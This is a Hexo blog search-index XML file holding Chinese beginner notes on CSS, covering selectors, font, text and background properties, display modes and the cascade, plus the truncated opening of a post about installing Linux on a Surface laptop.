<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS_层叠样式表笔记</title>
    <url>/2021/11/17/CSS_html/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CSS-层叠样式表笔记"><a href="#CSS-层叠样式表笔记" class="headerlink" title="CSS_层叠样式表笔记"></a>CSS_层叠样式表笔记</h1><blockquote>
<p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。<br>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p>
<h2 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h2><ul>
<li>标签选择器的作用是为页面中某一类标签指定统一的CSS样式</li>
<li>优点是能快速为页面中同类型的标签统一设置样式</li>
<li>缺点是不能设计差异化样式，只能选择全部的当前标签<pre class="line-numbers language-none"><code class="language-none">标签名 &#123;
    属性1: 属性值1;
&#125;

ul &#123;
    
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>规范：<ul>
<li>属性值前面，冒号后面，保留一个空格</li>
<li>标签名和大括号中间保留空格<h3 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h3>如果想要差异化选择不同的标签，单独选一个或者几个标签，可以使用类选择器<pre class="line-numbers language-none"><code class="language-none">.类名 &#123;
    属性1: 属性值1;
    .....
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li>结构需要用class属性来调用<pre class="line-numbers language-none"><code class="language-none">.red &#123;
    color: red;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<code>&lt;div class=&#39;red&#39;&gt;  变红色 &lt;/div&gt;</code></li>
</ul>
</blockquote>
<p>注意：</p>
<ol>
<li>类选择器在 HTML 中以 class 属性表示，在CSS中，类选择器以一个点 . 号表示</li>
<li>记忆口诀：样式点定义，结构类调用</li>
</ol>
<h3 id="类选择器多类名"><a href="#类选择器多类名" class="headerlink" title="类选择器多类名"></a>类选择器多类名</h3><ul>
<li>我们可以给一个标签指定多个类名，简单理解就是一个标签有多个名字</li>
</ul>
<p><code>&lt;div class=&quot;red font20&quot;&gt;名字&lt;/div&gt;</code><br>  <style><br>        .red {<br>            color: red;<br>        }
    </style></p>
<p><body>
    <div class="red">名字</div>
</body></p>
<ul>
<li>在标签 class 属性中写多个类名</li>
<li>多个类名中间必须用空格分开</li>
<li>这个标签就可以分别具有这些类名的样式<h4 id="多类名开发中使用场景："><a href="#多类名开发中使用场景：" class="headerlink" title="多类名开发中使用场景："></a>多类名开发中使用场景：</h4></li>
</ul>
<ol>
<li>可以把一些标签元素相同的样式(公共的部分)放到一个类里面</li>
<li>这些标签都可以调用这个公共的类，然后再调用自己独有的类</li>
<li>从而节省CSS代码，统一修改也方便</li>
</ol>
<h3 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h3><ul>
<li>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式</li>
<li>HTML 元素以 id属性 来设置 id 选择器，CSS中 id 选择器 以 “#” 来定义<pre class="line-numbers language-none"><code class="language-none">  &lt;style&gt;
        #pink &#123;
            color:pink;
        &#125;
    &lt;&#x2F;style&gt;

&lt;body&gt;
    &lt;div id&#x3D;&quot;pink&quot;&gt;秦大林子&lt;&#x2F;div&gt;
&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<style>
      #pink {
          color:pink;
      }
  </style>

</li>
</ul>
<p><body>
    <div id="pink">秦大林子</div>
</body><br>注意：</p>
<ul>
<li>id 属性只能在每个 HTML 文档中出现一次。</li>
<li>记忆口诀：样式 # 定义，结构 id 调用。只能调用一次，别人切勿使用<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3></li>
</ul>
<p>id选择器和类选择器的区别？</p>
<ul>
<li>类选择器（class）好比人的名字，一个人可以有多个名字，同时一个名字也可以被多个人使用</li>
<li>id 选择器好比人的身份证号码，全中国是唯一的，不得重复。</li>
<li>id 选择器和类选择器最大的不同在于使用次数上</li>
<li>类选择器在修改样式中用的最多，id 选择器一般用于页面唯一性的元素上，经常和 JavaScript 搭配使用。</li>
</ul>
<p>记忆口诀：</p>
<ul>
<li>样式点定义，结构类调用</li>
<li>样式 # 定义，结构 id 调用</li>
</ul>
<h3 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h3><ul>
<li>CSS 中， 通配符使用 * 定义，它表示选取页面中所有元素(标签)。<pre class="line-numbers language-none"><code class="language-none">* &#123;
    属性1：属性值1;
    ....
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>通配符选择器不需要调用，自动就给所有的元素使用样式</li>
<li>一般是用于清楚元素标签的内外边距<pre class="line-numbers language-none"><code class="language-none">* &#123;
    margin: 0;
    padding: 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="基础选择器总结"><a href="#基础选择器总结" class="headerlink" title="基础选择器总结"></a>基础选择器总结</h3><table><thead><tr><th>基础选择器</th><th>作用</th><th>特点</th><th>使用情况</th><th>语法</th></tr></thead><tbody><tr><td>标签选择器</td><td>可以选出所有相同的标签</td><td>不能差异化选择</td><td>较多</td><td>p {color: red}</td></tr><tr><td>类选择器</td><td>可以选出1个或者多个标签</td><td>可以根据需求选择</td><td>非常多</td><td>.nav {color: red}</td></tr><tr><td>id 选择器</td><td>一次只能选择1个标签</td><td>ID 属性只能在每个 HTML 文档中出现一次</td><td>一般和 js 搭配</td><td>#nav {color: red}</td></tr><tr><td>通配符选择器</td><td>选择所有的标签</td><td>选择的太多&#xff0c;有部分不需要</td><td>特殊情况使用</td><td>* {color: red}</td></tr></tbody></table>

</li>
</ul>
<h2 id="CSS字体属性"><a href="#CSS字体属性" class="headerlink" title="CSS字体属性"></a>CSS字体属性</h2><p> CSS 字体属性用于定义字体系列、大小、粗细和文字样式(如斜体)</p>
<h3 id="font-family"><a href="#font-family" class="headerlink" title="font-family"></a>font-family</h3><ul>
<li><p>CSS 使用 font-family 属性设置文本的字体系列<br><code>div &#123; font-family:Arial,&quot;Microsoft Yahe&quot;,&quot;微软雅黑&quot;; &#125;</code></p>
</li>
<li><p>各种字体之间必须使用英文状态下的逗号隔开</p>
</li>
<li>一般情况下，如果有空格隔开的多个单词组成的字体，加引号</li>
<li>最常见的几个字体：<pre class="line-numbers language-none"><code class="language-none">body &#123;
    font-family: &quot;Microsoft Yahe&quot;,tahoma,arial,&quot;Hiragino Sans GB&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="font-size"><a href="#font-size" class="headerlink" title="font-size"></a>font-size</h3></li>
<li><p>CSS 使用 font-size 属性设置字体大小</p>
<pre class="line-numbers language-none"><code class="language-none">p&#123;
    font-size: 20px;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>px (像素)大小是我们网页的最常用的单位</p>
</li>
<li>谷歌浏览器默认的文字大小为 16px</li>
</ul>
<h3 id="font-weight"><a href="#font-weight" class="headerlink" title="font-weight"></a>font-weight</h3><ul>
<li>CSS 使用 font-weight 属性设置字体的粗细<br><code>font-weight:  normal | bold |  bolder  | lighter |number</code></li>
</ul>
<table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>normal</td><td>默认值(不加粗的)&#xff0c;相当于<strong>number&#61;400</strong></td></tr><tr><td>bold</td><td>定义粗体(加粗的)&#xff0c;相当于<strong>number&#61;700</strong></td></tr><tr><td>bolder</td><td>定义特粗体</td></tr><tr><td>100-900</td><td>400等同于 normal&#xff0c;700等同于 bold&#xff0c;注意这个数字后面不跟单位</td></tr></tbody></table>

<h3 id="font-style"><a href="#font-style" class="headerlink" title="font-style"></a>font-style</h3><ul>
<li>CSS 使用 font-style 属性设置文字样式<pre class="line-numbers language-none"><code class="language-none">p&#123;
  font-style: normal;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<ol>
<li>normal    默认值，浏览器会显示标准的字体样式</li>
<li>italic    浏览器会显示斜体的字体样式<br>注意：平时我们很少给文字加斜体，反而要给斜体标签( em , i )改为不倾斜字体</li>
</ol>
<h3 id="字体属性复合写法"><a href="#字体属性复合写法" class="headerlink" title="字体属性复合写法"></a>字体属性复合写法</h3><p>字体复合属性可以把以上文字样式综合来写，这样写更节约代码，例如：<br><pre class="line-numbers language-none"><code class="language-none">&lt;style&gt;
        &#x2F;* 想要div 文字变倾斜 加粗 字号设置为16像素 并且是微软雅黑 *&#x2F;
        
        div &#123;
            font-style: italic;
            font-weight: 700;
            font-size: 16px;
            font-family: &#39;Microsoft yahe&#39;;
            &#x2F;* 复合属性：简写的方式  节约代码*&#x2F;
            &#x2F;* 顺序：font-style font-weight  font-size&#x2F;line-height  font-family *&#x2F;
            font: italic 700 16px &#39;Microsoft yahe&#39;;
        &#125;
&lt;&#x2F;style&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li>顺序：文字样式 文字粗细 文字大小 文字字体</li>
<li>使用font属性时，必须按照上面语法格式中的顺序书写，不能更换顺序，并且各个属性间以空格隔开</li>
<li>不需要设置的属性可以省略(取默认值)，但必须保留font-size 和font-family属性，否则 font 属性将不起作用<h3 id="字体属性总结"><a href="#字体属性总结" class="headerlink" title="字体属性总结"></a>字体属性总结</h3></li>
</ul>
<table><thead><tr><th>属性</th><th>表示</th><th>注意点</th></tr></thead><tbody><tr><td>font-style</td><td>字体样式</td><td>记住倾斜是 italic&#xff0c;不倾斜是 normal&#xff0c;实际开发最常用 normal</td></tr><tr><td>font-weight</td><td>字体粗细</td><td>加粗是 700 或者 bold &#xff0c;不加粗是 normal 或者 400&#xff0c;记住数字不加单位</td></tr><tr><td>font-size</td><td>字号</td><td>我们通常用的单位是 px &#xff0c;一定要跟上单位</td></tr><tr><td>font-family</td><td>字体</td><td>实际工作中按照团队约定来写字体</td></tr><tr><td>font</td><td>字体连写</td><td>①字体连写是有顺序的&#xff0c;不能随意换位置 ② <strong>字体和字号必须同时出现</strong></td></tr></tbody></table>

<h2 id="CSS文本属性"><a href="#CSS文本属性" class="headerlink" title="CSS文本属性"></a>CSS文本属性</h2><p>CSS 文本属性可以设置文本的 外观，比如文本颜色、对齐文本、装饰文本、文本缩进、行间距的等</p>
<h3 id="color"><a href="#color" class="headerlink" title="color"></a>color</h3><ul>
<li>color 属性用于定义文本的颜色<pre class="line-numbers language-none"><code class="language-none">div &#123;
    color: red;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<ol>
<li>预定义的颜色值    red，green，blue，pink等</li>
<li>十六进制    #FF0000, #FF6600，#29D794</li>
<li>RGB代码    rgb（255，0，0） 或rgb(100%，0%，0%)<h3 id="text-again"><a href="#text-again" class="headerlink" title="text-again"></a>text-again</h3>text-align 属性用于设置文本内容的水平对齐方式<pre class="line-numbers language-none"><code class="language-none">div &#123;
    text-align:center;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="text-decoration"><a href="#text-decoration" class="headerlink" title="text-decoration"></a>text-decoration</h3></li>
</ol>
<ul>
<li>text-decoration 属性用于装饰文本，可以给文本添加下划线，删除线，上划线等<pre class="line-numbers language-none"><code class="language-none">div &#123;
    text-decoration: underline;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<ol>
<li>none    默认。没有装饰线(最常用)</li>
<li>underline    下划线，链接自带下划线（常用）</li>
<li>overline    上划线(几乎不用)</li>
<li>line-through    删除线 (不常用)</li>
</ol>
<h3 id="text-indent"><a href="#text-indent" class="headerlink" title="text-indent"></a>text-indent</h3><ul>
<li>text-indent 属性用于指定文本的第一行缩进，通常是将段落的首行缩进<pre class="line-numbers language-none"><code class="language-none">div &#123;
    text-indent: 10px;
&#125;

p&#123;
   text-indent: 2em;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>通过设置该水属性，所有元素的第一行都可以缩进一个给定的长度，甚至该长度可以是负值</li>
<li>em是一个相对单位，就是当前元素(font-size)1个文字的大小</li>
<li>如果当前元素没有设置大小，则会按照父元素的一个文字大小</li>
</ul>
<h3 id="line-height"><a href="#line-height" class="headerlink" title="line-height"></a>line-height</h3><ul>
<li>line-height 属性用于设置行间的距离(行高)，可以控制文字行与行之间的距离<pre class="line-numbers language-none"><code class="language-none">p &#123;
   line-height: 26px;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
行间距包括上间距、文本高度、下间距</li>
</ul>
<h3 id="文本属性总结"><a href="#文本属性总结" class="headerlink" title="文本属性总结"></a>文本属性总结</h3><ol>
<li>color    文本颜色    通常用十六进制，而且是简写形式 #fff</li>
<li>text-align    文本对齐    可以设定文字水平的对齐方式</li>
<li>text-indent    文本缩进    段落首行缩进</li>
<li>text-decoration    文本修饰    记住添加下划线 underline 取消下划线 none</li>
<li>line-height    行高    控制行与行之间的距离</li>
</ol>
<h2 id="CSS复合选择器"><a href="#CSS复合选择器" class="headerlink" title="CSS复合选择器"></a>CSS复合选择器</h2><p>复合选择器：是由两个或多个基础选择器，通过不同的方式组合而成的</p>
<p>常用的复合选择器包括：后代选择器、子选择器、并集选择器、伪类选择器</p>
<h3 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h3><ul>
<li>后代选择器又称为包含选择器，可以选择父元素里面的子元素</li>
<li>其写法就是把外层标签写在前面，内层标签写在后面，中间用空格分隔，当标签发生嵌套时，内层标签就称为外层标签的后代<pre class="line-numbers language-none"><code class="language-none">元素1 元素2 &#123;
    样式声明
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
上述语法表示选择元素1里面的所有元素2(后代元素)，例如<pre class="line-numbers language-none"><code class="language-none">&#x2F;*选择ul 里面的所有 li 标签元素*&#x2F;
ul li &#123;
    
    样式声明
    
&#125;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>元素1 和 元素2 中间用空格隔开</li>
<li>元素1 是父级，元素2 是子级，最终选择的是元素2<h3 id="子选择器"><a href="#子选择器" class="headerlink" title="子选择器"></a>子选择器</h3></li>
<li>子元素选择器只能选择作为某元素的最近一级子元素，简单理解就是选亲儿子元素。<pre class="line-numbers language-none"><code class="language-none">元素1 &gt; 元素2&#123;
    样式声明
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<p>上述语法表示选择元素1 里面的所有直接后代(子元素)元素2，例如<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;*选择div里面所有最近一级 P 标签元素*&#x2F; 
div &gt; p&#123;
    样式声明
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li>元素1 和 元素2 中间用大于号隔开</li>
<li>元素1 是父级，元素2 是子级，最终选择的是元素2</li>
<li>元素2必须是亲儿子，其孙子、重孙之类都不归他管<h3 id="并集选择器"><a href="#并集选择器" class="headerlink" title="并集选择器"></a>并集选择器</h3><strong>并集选择器可以选择多组标签，同时为它们定义相同的样式。</strong></li>
</ul>
<p>并集选择器是各选择器通过英文逗号连接而成<br>任何形式的选择器都可以作为并集选择器的一部分<br><pre class="line-numbers language-none"><code class="language-none">元素1,元素2 &#123;
    样式声明
&#125;   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>上述语法表示选择元素1和元素2，例如<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;*选择  ul  和  div 标签元素 *&#x2F;
ul,div &#123;
    样式声明
&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li>元素1 和 元素2 中间用逗号隔开</li>
<li>逗号可以理解为和的意思</li>
<li>并集选择器通常用于集体声明<h3 id="伪类选择器🔥"><a href="#伪类选择器🔥" class="headerlink" title="伪类选择器🔥"></a>伪类选择器🔥</h3></li>
<li>伪类选择器用于向某些选择器添加特殊的效果，比如给链接添加特殊效果，或选择第1个，第n个元素</li>
<li>伪类选择器书写最大的特点是<strong>用冒号(😃</strong>表示，比如 :hover、:first-child</li>
<li>伪类选择器很多，比如有链接伪类、结构伪类，这里先记录常用的链接伪类选择器<h3 id="链接伪类选择器🔥"><a href="#链接伪类选择器🔥" class="headerlink" title="链接伪类选择器🔥"></a>链接伪类选择器🔥</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;* a是标签选择器 *&#x2F;
a &#123;
    color:gray;
&#125;

&#x2F;* :hover 是链接伪类选择器，鼠标经过 *&#x2F;
a :hover &#123;
    &#x2F;*鼠标经过的时候，由原来的灰色  变成了红色*&#x2F;
   color:red; 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="focus伪类选择器🔥"><a href="#focus伪类选择器🔥" class="headerlink" title="focus伪类选择器🔥"></a>focus伪类选择器🔥</h3><ul>
<li>:focus伪类选择器用于选取获得焦点的表单元素</li>
<li>焦点就是光标，一般情况<code>&lt;input&gt;</code>类表单元素才能获取，因此这个选择器也主要针对表单元素来说<pre class="line-numbers language-none"><code class="language-none">input : focus &#123;
    background-color:yellow;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
效果：</li>
</ul>
<p>input : focus {<br>    background-color:yellow;<br>}</p>
<input>

<h3 id="复合选择器总结🔥"><a href="#复合选择器总结🔥" class="headerlink" title="复合选择器总结🔥"></a>复合选择器总结🔥</h3><ol>
<li>后代选择器    用来选择后代元素    可以是子孙后代    较多    符号是空格 .nav a</li>
<li>子代选择器    选择最近一级元素    只选亲儿子    较少    符号是大于 .nav&gt;p</li>
<li>并集选择器    选择某些相同样式的元素    可以用于集团声明    较多    符号是逗号 .nav,.header</li>
<li>链接伪类选择器    选择不同状态的链接    跟链接相关    较多    重点记住a{}和a:hover ，5实际开发的写法</li>
<li>:focus选择器    选择获得光标的表单    跟表单相关    较少    input:focus 记住这个写法</li>
</ol>
<h2 id="CSS元素显示模式"><a href="#CSS元素显示模式" class="headerlink" title="CSS元素显示模式"></a>CSS元素显示模式</h2><p>常见的块元素有<code>&lt;h1&gt;~&lt;h6&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;</code>等，其中<code>&lt;div&gt;</code> 标签是最典型的块元素。</p>
<h3 id="块级元素的特点："><a href="#块级元素的特点：" class="headerlink" title="块级元素的特点："></a>块级元素的特点：</h3><ol>
<li><p>比较霸道，自己独占一行</p>
</li>
<li><p>高度，宽度，外边距以及内边距都可以控制</p>
</li>
<li><p>宽度默认是容器（父级宽度）的100%</p>
</li>
<li><p>是一个容器及盒子，里面可以放行内或块级元素</p>
</li>
</ol>
<p>注意：</p>
<ol>
<li><p>文字类的元素内不能使用块级元素</p>
</li>
<li><p><code>&lt;p&gt;</code>标签主要用于存放文字，因此<code>&lt;p&gt;</code>里面不能放块级元素，特别是不能放<code>&lt;div&gt;</code></p>
</li>
<li><p>同理，<code>&lt;h1&gt;~&lt;h6&gt;</code>等都是文字类块级标签，里面也不能存放其他块级元素。</p>
</li>
</ol>
<h3 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h3><ol>
<li><p>常见的行内元素有<code>&lt;a&gt;、&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;、&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;span&gt;</code>等</p>
</li>
<li><p>其中<span>标签是最典型的行内元素。有的地方也将行内元素称为内联元素。</p>
</li>
<li><p>行内元素的特点：</p>
<ul>
<li><p>相邻行内元素在一行上，一行可以显示多个</p>
</li>
<li><p>高，宽直接设置是无效的</p>
</li>
<li><p>默认宽度就是它本身内容的宽度</p>
</li>
<li><p>行内元素只能容纳文本或其他行内元素</p>
</li>
</ul>
</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li>链接里面不能再放链接</li>
<li>特殊情况链接<code>&lt;a&gt;</code>里面可以放块级元素，但是给<code>&lt;a&gt;</code>转换一下块级模式最安全</li>
</ul>
<h3 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h3><ol>
<li>在行内元素中有几个特殊的标签 ——<code>&lt;img /&gt;、&lt;input /&gt;、&lt;td&gt;，</code>它们同时具有块元素和行内元素的特点</li>
<li>有些资料称它们为行内块元素</li>
<li>特点：<ul>
<li>和相邻行内元素在一行上，但是他们之间会有空白缝隙。一行可以显示多个(行内元素特点)</li>
<li>默认宽度就是它本身内容的宽度(行内元素特点)</li>
<li>高度，行高，外边距以及内边距都可以控制(块级元素特点)<h3 id="元素显示模式总结"><a href="#元素显示模式总结" class="headerlink" title="元素显示模式总结"></a>元素显示模式总结</h3></li>
</ul>
</li>
<li>块级元素    一行只能放一个块级元素    可以设置宽度高度    容器的100%    容器级可以包含任何标签</li>
<li>行内元素    一行可以放多个行内元素    不可以直接设置宽度高度    它本身内容的宽度    容纳文本或其他行内元素</li>
<li>行内块元素    一行放多个行内块元素    可以设置宽度高度    它本身内容的宽度    <h3 id="元素显示模式转换"><a href="#元素显示模式转换" class="headerlink" title="元素显示模式转换"></a>元素显示模式转换</h3></li>
</ol>
<ul>
<li>转换为块元素： <code>display:block</code></li>
<li>转换为行内元素：<code>display:inline</code></li>
<li>转换为行内块元素: <code>display:inline-block</code></li>
</ul>
<h2 id="CSS背景"><a href="#CSS背景" class="headerlink" title="CSS背景"></a>CSS背景</h2><p>通过 CSS 背景属性，可以给页面元素添加背景样式。<br>背景属性可以设置背景颜色、背景图片、背景平铺、背景图片位置、背景图像固定等。</p>
<h3 id="background-color"><a href="#background-color" class="headerlink" title="background-color"></a>background-color</h3><ul>
<li>background-color 属性定义了元素的背景颜色<br><code>background-color: transparent;</code></li>
<li>一般情况下默认颜色是transparent（透明），我们也可以手动指定背景颜色为透明色<h3 id="background-image"><a href="#background-image" class="headerlink" title="background-image"></a>background-image</h3></li>
<li>background-image 属性描述了元素的背景图像。<br><code>background-image : none | url(url)</code></li>
</ul>
<ol>
<li>none    无背景图（默认）</li>
<li>url    使用绝对或相地址指定的背景图像<blockquote>
<p>注意：背景图片后面的地址，千万不要忘记加URL，同时里面的路径不要加引号。</p>
</blockquote>
</li>
</ol>
<h3 id="background-repeat"><a href="#background-repeat" class="headerlink" title="background-repeat"></a>background-repeat</h3><ul>
<li>background-repeat 属性定义背景图像的平铺<br><code>background-repeat: repeat| no-repeat| repeat-x| repeat-y</code></li>
</ul>
<ol>
<li>repeat    背景图像在纵向和横向上平铺(默认的)</li>
<li>no-repeat    背景图像不平铺</li>
<li>repeat-x    背景图像在横向上平铺</li>
<li>repeat-y    背景图像在纵向平铺<h3 id="background-position"><a href="#background-position" class="headerlink" title="background-position"></a>background-position</h3></li>
</ol>
<ul>
<li>background-position 属性可以改变图片在背景中的位置<br><code>background-position: x y;</code></li>
<li>参数：X坐标 Y坐标</li>
<li>可以使用 方位名词 或者 精确单位</li>
</ul>
<ol>
<li>length    百分数|由浮点数字和单位标识符组成的长度值</li>
<li><p>position    top| center | bottom |left |center |right 方位名词</p>
</li>
<li><p>参数是方位名词</p>
<ul>
<li>如果指定的两个值都是方位名词，则两个值前后顺序无关，比如left top和top left</li>
<li>如果只指定了一个方位名词，另一个值省略，则第二个值默认居中对齐</li>
</ul>
</li>
<li>参数是精准单位<ul>
<li>如果参数值是精确坐标，那么第一个肯定是x坐标，第二个一定是y坐标</li>
<li>如果只指定一个数值，那该数值一定是x坐标，另一个默认垂直居中</li>
</ul>
</li>
<li>参数是混合单位<ul>
<li>如果指定的两个值是精确单位和方位名词混合使用，则第一个值是x坐标，第二个值是y坐标</li>
</ul>
</li>
</ol>
<h3 id="background-attachment"><a href="#background-attachment" class="headerlink" title="background-attachment"></a>background-attachment</h3><ul>
<li>background-attachment 属性设置背景图像是否固定或者随着页面的其余部分滚动<br><code>background-attachment : scroll | fixed</code></li>
</ul>
<ol>
<li>scroll    背景图像是随对象内容滚动</li>
<li>fixed    背景图像固定<h3 id="背景复合写法🔥"><a href="#背景复合写法🔥" class="headerlink" title="背景复合写法🔥"></a>背景复合写法🔥</h3></li>
</ol>
<ul>
<li>background ： 背景颜色 背景图片地址 背景平铺 背景图像滚动 背景图片位置<br><code>background : transparent url(image.jpg) repeat-y fixed top;</code></li>
</ul>
<h3 id="背景色半透明🔥"><a href="#背景色半透明🔥" class="headerlink" title="背景色半透明🔥"></a>背景色半透明🔥</h3><p>CSS3为我们提供了背景颜色半透明的效果</p>
<p><code>background : rgba(0,0,0,0.3);</code></p>
<ol>
<li>最后一个参数是alpha 透明度 ，取值范围在0~1之间</li>
<li>我们习惯把0.3的 0省略掉，写为background(0,0,0,.3);</li>
<li>注意：背景半透明是指盒子背景半透明，盒子里面的内容不受影响</li>
</ol>
<h3 id="背景总结🔥"><a href="#背景总结🔥" class="headerlink" title="背景总结🔥"></a>背景总结🔥</h3><ol>
<li>background-color    背景颜色    预定义的颜色值/十六进制/RGB代码</li>
<li>background-image    背景图片    url(图片路径)</li>
<li>background-repeat    是否平铺    repeat/ no-repeat /repeat-x/repeat-y</li>
<li>background-position    背景位置    length/position 分别是x 和y坐标</li>
<li>background-attachment    背景附着    scroll(背景滚动) /fixed(背景固定)</li>
<li>背景简写    书写更简单    背景颜色 背景图片地址 背景平铺 背景滚动 背景位置</li>
<li>背景色半透明    背景颜色半透明    background : rgba(0,0,0,0.3);后面必须是四个值<br>背景图片:实际开发常见于 logo 或者一些装饰性的小图片或者是超大的背景图片, 优点是非常便于控制位置.</li>
</ol>
<h2 id="CSS三大特性"><a href="#CSS三大特性" class="headerlink" title="CSS三大特性"></a>CSS三大特性</h2><h3 id="层叠性"><a href="#层叠性" class="headerlink" title="层叠性"></a>层叠性</h3><ul>
<li>相同选择器设置相同的样式，此时一个样式就会覆盖另一个冲突的样式。</li>
<li>层叠性主要解决样式冲突的问题</li>
<li>层叠性原则：<ul>
<li>样式冲突，遵循的原则是就近原则<h3 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h3></li>
</ul>
</li>
<li>CSS中的继承：子标签会继承父标签里面的某些样式</li>
<li>如文本颜色和字号等<br>特殊： 行高的继承<pre class="line-numbers language-none"><code class="language-none">body &#123;
        font:12px&#x2F;1.5   Microsoft YaHei
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<p>1.5的意思：让里面所有的子元素的行高是当前文字大小的1.5倍</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/115560532">CSS基础班笔记(一)</a></li>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/115560502">CSS基础班笔记(二)</a></li>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/115726577">CSS基础班笔记(三)</a></li>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/119172527">CSS进阶班笔记(四)</a></li>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/120374974">CSS进阶班笔记(五)</a></li>
</ul>
]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>surface完美安装linux操作系统、hexo博客</title>
    <url>/2021/03/19/Deepin%E7%B3%BB%E7%BB%9F%E4%B8%8Esurface%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="surface完美安装linux操作系统、hexo博客"><a href="#surface完美安装linux操作系统、hexo博客" class="headerlink" title="surface完美安装linux操作系统、hexo博客"></a><center>surface完美安装linux操作系统、hexo博客</center></h1><p>最近由于linux课程需要使用linux系统，于是在ubuntu、kali、Elementary OS、Chrome OS和deepin操作系统中选择一个比较靠谱的。<br><span id="more"></span></p>
